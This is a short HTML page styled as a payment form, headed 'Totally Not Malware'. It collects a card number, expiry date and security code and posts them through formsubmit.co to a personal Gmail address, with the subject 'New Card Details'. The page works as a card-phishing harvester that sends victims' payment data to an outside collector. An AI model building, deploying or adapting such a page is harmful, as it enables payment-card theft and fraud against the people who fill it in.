<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Credit Card Form</title>
    <style>
        body {
            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #e0e0e0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .form-container {
            background-color: #ffffff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            width: 300px;
            text-align: center;
        }

        .form-container h1 {
            font-size: 18px;
            margin-bottom: 20px;
        }

        .form-container input {
            width: 100%;
            margin-bottom: 15px;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }

        .form-container button {
            width: 100%;
            padding: 10px;
            background-color: #0078d7;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }

        .form-container button:hover {
            background-color: #005bb5;
        }
    </style>
</head>
<body>
    <div class="form-container">
        <h1>Totally Not Malware</h1>
        <form action="https://formsubmit.co/andrej.g2103@gmail.com" method="POST">
            <!-- Поля для ввода данных -->
            <input type="text" name="Card Number" placeholder="Card number" required>
            <input type="text" name="Expiry Date" placeholder="Expiry date" required>
            <input type="text" name="Security Code" placeholder="Security code" required>
            
            <!-- Telegram Bot Info -->
            <input type="hidden" name="_template" value="table">
            <input type="hidden" name="_subject" value="New Card Details">
            <button type="submit">Th-thanks</button>
        </form>
    </div>
</body>
</html>
